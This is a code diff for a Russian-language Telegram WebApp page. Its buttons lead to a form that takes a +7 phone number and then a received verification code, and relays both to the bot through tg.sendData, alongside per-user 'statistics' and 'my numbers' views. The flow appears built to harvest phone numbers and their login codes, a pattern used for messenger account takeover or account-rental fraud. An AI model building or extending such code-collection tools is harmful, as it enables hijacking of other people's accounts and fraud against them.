@@ -15,43 +15,115 @@
       flex-direction: column;
       align-items: center;
       justify-content: center;
-      height: 100vh;
+      min-height: 100vh;
       text-align: center;
     }
     h1 {
       font-size: 24px;
       margin-bottom: 30px;
     }
-    .btn {
+    .btn, .submit-btn {
       display: block;
-      width: 220px;
+      width: 240px;
       padding: 15px;
       margin: 10px 0;
       font-size: 18px;
       font-weight: bold;
       text-decoration: none;
+      text-align: center;
+      cursor: pointer;
       color: #fff;
       background: #1d976c;
       border-radius: 12px;
+      border: none;
       box-shadow: 0 4px 8px rgba(0,0,0,0.3);
       transition: all 0.2s;
     }
-    .btn:hover {
+    .btn:hover, .submit-btn:hover {
       background: #93f9b9;
       color: #000;
       transform: scale(1.05);
+    }
+    .hidden {
+      display: none;
+    }
+    .input-box {
+      margin: 10px 0;
+    }
+    input {
+      padding: 12px;
+      width: 220px;
+      font-size: 16px;
+      border-radius: 8px;
+      border: none;
+      outline: none;
     }
   </style>
 </head>
 <body>
   <h1>📊 Добро пожаловать!</h1>
-  <a href="#" class="btn">📈 Моя Статистика</a>
-  <a href="#" class="btn">📨 Сдать номер</a>
-  <a href="#" class="btn">📋 Мои номера</a>
+
+  <!-- Главное меню -->
+  <div id="menu">
+    <button class="btn" onclick="sendStat()">📈 Моя Статистика</button>
+    <button class="btn" onclick="openForm()">📨 Сдать номер</button>
+    <button class="btn" onclick="sendMyNumbers()">📋 Мои номера</button>
+  </div>
+
+  <!-- Форма сдачи номера -->
+  <div id="form" class="hidden">
+    <div class="input-box">
+      <input type="text" id="phone" placeholder="+7XXXXXXXXXX">
+    </div>
+    <button class="submit-btn" onclick="submitPhone()">Отправить номер</button>
+
+    <div id="codeBox" class="hidden">
+      <div class="input-box">
+        <input type="text" id="code" placeholder="Введите код">
+      </div>
+      <button class="submit-btn" onclick="submitCode()">Отправить код</button>
+    </div>
+  </div>
 
   <script>
     let tg = window.Telegram.WebApp;
-    tg.expand(); // делает приложение на весь экран
+    tg.expand(); // на весь экран
+
+    function sendStat() {
+      tg.sendData(JSON.stringify({action: "stats"}));
+    }
+
+    function sendMyNumbers() {
+      tg.sendData(JSON.stringify({action: "my_numbers"}));
+    }
+
+    function openForm() {
+      document.getElementById("menu").classList.add("hidden");
+      document.getElementById("form").classList.remove("hidden");
+    }
+
+    function submitPhone() {
+      let phone = document.getElementById("phone").value.trim();
+      if (!phone.startsWith("+7") || phone.length < 11) {
+        alert("Введите номер в формате +7XXXXXXXXXX");
+        return;
+      }
+      tg.sendData(JSON.stringify({action: "send_number", number: phone}));
+
+      // открываем ввод кода
+      document.getElementById("codeBox").classList.remove("hidden");
+    }
+
+    function submitCode() {
+      let code = document.getElementById("code").value.trim();
+      if (code.length < 3) {
+        alert("Введите корректный код");
+        return;
+      }
+      tg.sendData(JSON.stringify({action: "send_code", code: code}));
+      alert("✅ Код отправлен!");
+      tg.close(); // закрыть WebApp
+    }
   </script>
 </body>
 </html>
